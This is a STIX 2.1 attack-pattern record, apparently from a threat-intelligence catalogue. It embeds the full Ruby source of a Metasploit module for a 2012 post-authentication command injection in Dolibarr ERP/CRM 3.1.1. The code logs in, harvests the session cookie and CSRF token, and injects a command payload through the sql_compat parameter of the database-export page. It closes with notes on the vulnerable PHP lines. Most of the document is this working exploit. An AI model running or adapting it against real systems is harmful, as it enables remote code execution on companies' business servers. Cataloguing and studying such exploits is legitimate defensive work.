{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--be07d97d-4195-4736-b9ec-9bc9ff5cb67a",
    "created": "2024-08-14T17:02:55.357323Z",
    "modified": "2024-08-14T17:02:55.357327Z",
    "name": "\"Dolibarr ERP/CRM Post-Auth OS Command Injection\"",
    "description": " This module exploits a vulnerability found in Dolibarr ERP/CRM 3's backup feature.  This software is used to manage a company's business information such as contacts, invoices, orders, stocks, agenda, etc. When processing a database backup request, the export.php function does not check the input given to the sql_compat parameter, which allows a remote authenticated attacker to inject system commands into it and then gain arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dolibarr_cmd_exec.rb",
            "external_id": "dolibarr_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2012/Apr/78"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Dolibarr ERP/CRM Post-Auth OS Command Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Dolibarr ERP/CRM 3's\n        backup feature.  This software is used to manage a company's business\n        information such as contacts, invoices, orders, stocks, agenda, etc.\n        When processing a database backup request, the export.php function\n        does not check the input given to the sql_compat parameter, which allows\n        a remote authenticated attacker to inject system commands into it,\n        and then gain arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nahuel Grisolia <nahuel[at]cintainfinita.com.ar>',  #Discovery, PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '80980'],\n          ['URL', 'https://seclists.org/fulldisclosure/2012/Apr/78']\n        ],\n      'Arch'            => ARCH_CMD,\n      'Compat'          =>\n        {\n          'PayloadType' => 'cmd'\n        },\n      'Platform'       => %w{ linux unix },\n      'Targets'        =>\n        [\n          # Older versions are probably also vulnerable according to\n          # Nahuel's report on full disclosure\n          ['Dolibarr 3.1.1 on Linux', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-06',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('USERNAME',  [true, 'Dolibarr Username', 'admin']),\n          OptString.new('PASSWORD',  [true, 'Dolibarr Password', 'test']),\n          OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])\n        ])\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    if res and res.body =~ /Dolibarr 3\\.1\\.1/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def get_sid_token\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => @uri.path\n    })\n\n    return [nil, nil] if res.nil? || res.get_cookies.empty?\n\n    # Get the session ID from the cookie\n    m = res.get_cookies.match(/(DOLSESSID_.+);/)\n    id = (m.nil?) ? nil : m[1]\n\n    # Get the token from the decompressed HTTP body response\n    m = res.body.match(/type=\"hidden\" name=\"token\" value=\"(.+)\"/)\n    token = (m.nil?) ? nil : m[1]\n\n    return id, token\n  end\n\n  def login(sid, token)\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => \"#{@uri.path}index.php\",\n      'cookie'   => sid,\n      'vars_post' => {\n        'token'         => token,\n        'loginfunction' => 'loginfunction',\n        'tz'            => '-6',\n        'dst'           => '1',\n        'screenwidth'   => '1093',\n        'screenheight'  => '842',\n        'username'      => datastore['USERNAME'],\n        'password'      => datastore['PASSWORD']\n      }\n    })\n\n    location = res.headers['Location']\n    return (location =~ /admin\\//)\n  end\n\n  def exploit\n    @uri = target_uri\n    @uri.path << \"/\" if @uri.path[-1, 1] != \"/\"\n    peer = \"#{rhost}:#{rport}\"\n\n    print_status(\"Getting the sid and token...\")\n    sid, token = get_sid_token\n    if sid.nil?\n      print_error(\"Unable to retrieve a session ID\")\n      return\n    elsif token.nil?\n      print_error(\"Unable to retrieve a token\")\n      return\n    end\n\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    print_status(\"Attempt to login with \\\"#{user}:#{pass}\\\"\")\n    success = login(sid, token)\n    if not success\n      print_error(\"Unable to login\")\n      return\n    end\n\n    print_status(\"Sending malicious request...\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(@uri.path, \"admin/tools/export.php\"),\n      'cookie'    => sid,\n      'vars_post' => {\n        'token'             => token,\n        'export_type'       => 'server',\n        'what'              => 'mysql',\n        'mysqldump'         => '/usr/bin/mysqldump',\n        'use_transaction'   => 'yes',\n        'disable_fk'        => 'yes',\n        'sql_compat'        => \";#{payload.encoded};\",\n        'sql_structure'     => 'structure',\n        'drop'              => '1',\n        'sql_data'          => 'data',\n        'showcolumns'       => 'yes',\n        'extended_ins'      => 'yes',\n        'delayed'           => 'yes',\n        'sql_ignore'        => 'yes',\n        'hexforbinary'      => 'yes',\n        'filename_template' => 'mysqldump_dolibarrdebian_3.1.1_201203231716.sql',\n        'compression'       => 'none'\n      }\n    })\n\n  end\nend\n\n=begin\nNotes:\n\n114    if ($_POST[\"sql_compat\"] && $_POST[\"sql_compat\"] != 'NONE') $param.=\" --compatible=\".$_POST[\"sql_compat\"];\n...\n137    $paramcrypted=$param;\n...\n159    $fullcommandcrypted=$command.\" \".$paramcrypted.\" 2>&1\";\n...\n165    if ($handle)\n166    {\n....\n169    $handlein = popen($fullcommandclear, 'r');\n....\n185    }\n=end\n",
    "x_mitre_disclosure_date": "2012-04-06",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}